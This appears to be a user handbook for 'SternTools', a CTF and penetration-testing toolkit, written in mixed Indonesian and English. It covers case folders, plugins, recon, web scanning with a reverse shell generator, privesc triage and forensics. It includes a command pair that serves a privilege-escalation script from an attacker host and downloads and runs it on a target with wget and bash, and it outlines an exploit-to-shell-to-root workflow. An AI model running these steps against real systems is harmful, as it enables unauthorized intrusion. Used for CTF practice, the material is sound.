# STERNTOOLS HANDBOOK v1.3

## Case Management

Before starting, buat case baru:

```
Menu → C (Create New Case)
→ Masukkan nama, misal: ctf_2025_01
→ Otomatis bikin folder cases/ctf_2025_01/{input,output,logs,reports,notes.txt}
```

**Kenapa penting?** Output tiap CTF nggak bakal campur aduk. Notes juga otomatis kegenerate.

**Switch case:** `Menu → S` — pilih case yang mau diaktifin.

---

## Plugin System

Cara bikin plugin:
1. Buat file `.sh` di folder `plugins/`
2. Isi dengan 3 komponen wajib:

```bash
PLUGIN_NAME="My Tool"
PLUGIN_DESC="Does something cool"

plugin_main() {
    # kode kamu di sini
    echo "Halo dari plugin!"
    read -p "[Enter] kembali..."
}
```

3. Jalankan `./sterntools.sh` — plugin langsung muncul di menu dengan key `p1`, `p2`, dst.

---

## Cara Pakai Setiap Menu

### [1] Recon & OSINT
**Input:** IP atau domain  
**Alur:** Fast scan (masscan/nmap -p-) → service version → jika web port terbuka → feroxbuster + subfinder

### [2] Web Vuln Scanner
**Input:** URL (http://target)  
**Alur:** whatweb → nuclei (CVE) → nikto → **Reverse shell generator** (5 format)

### [3] Privesc Triage
**Dual mode:** Jalankan lokal atau kirim ke server target via:
```bash
# Host:
python3 -m http.server 8080
# Target:
wget http://HOST:8080/modules/privesc_triage.sh
bash privesc_triage.sh
```

### [4-7] Forensics
File, memory, network, log — masing-masing nerima file target dan menghasilkan output terstruktur.

### [8] Build Master Timeline
Gabungin semua timestamp dari RAM (os_info.txt), Network (http_requests.txt), Log (web_attacks.txt) jadi satu kronologi rapi.

### [9] Export All Reports
Kumpulin semua summary dari output forensics ke satu file.

---

## Tips CTF Writeup

1. **Create case** (C) → `ctf_xyz`
2. **Recon** (1) → catat port + service
3. **Web vuln** (2) → exploitt, dapatkan shell
4. **Upload privesc** (3) → root
5. **Forensics** (4-7) → analisis file bukti
6. **Timeline** (8) → kronologi serangan
7. **Notes** (N) → catat flag temuan

---

## Troubleshooting

**Tools not found:** Jalankan `bash install.sh`
**Plugin tidak muncul:** Cek format file — harus ada `PLUGIN_NAME=` dan `plugin_main()`
**Case tidak ke-detect:** Cek folder `cases/.active` — isinya harus nama folder yang valid
